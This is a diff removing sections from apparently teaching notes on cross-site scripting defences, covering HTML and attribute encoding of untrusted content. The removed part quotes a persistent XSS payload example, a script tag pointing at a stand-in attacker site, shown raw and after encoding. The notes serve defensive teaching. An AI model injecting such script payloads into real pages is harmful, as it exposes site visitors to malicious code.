@@ -261,36 +261,6 @@ Notes:
 
 ---
 
-## HTML Encoding
-
-- HTML encoding is the process of replacing HTML special characters with a coded replacements
-  - This forces HTML to be treated as raw text and NOT as executable markup by the browser
-  - For example "<" is encoded as "\&lt;"
-- In the persistent XSS example, the injected payload was
-```html
-Well thought out essay, loved it!!
-<script>http://attackerwebsite.com/maliciousscript.js</script>
-```
-- After HTML encoding, it is treated as text and looks like
-```
-Well thought out essay, loved it!!
-&lt;script&gt;http://attackerwebsite.com/maliciousscript.js&lt;/script&gt;
-```
----
-
-## Other Defences Against XSS
-
-- Any content that does not come from trusted sources is flagged as _untrusted content_
-- Any untrusted content should be inserted only in specified and monitored locations
-- No untrusted content is used as content in an HTML element without being HTML encoded
-  - This ensures the content is treated as data and not as markup
-- All attribute values must be attribute encoded
-  - Attribute encoding is a subset of HTML encoding 
-  - A different encoding is used because attributes are parsed differently than HTML elements
-- Similar encoding rules exist for CSS and JavaScript
-
----
-
 ## Other Defences Against XSS
 
 - Sanitize all untrusted content
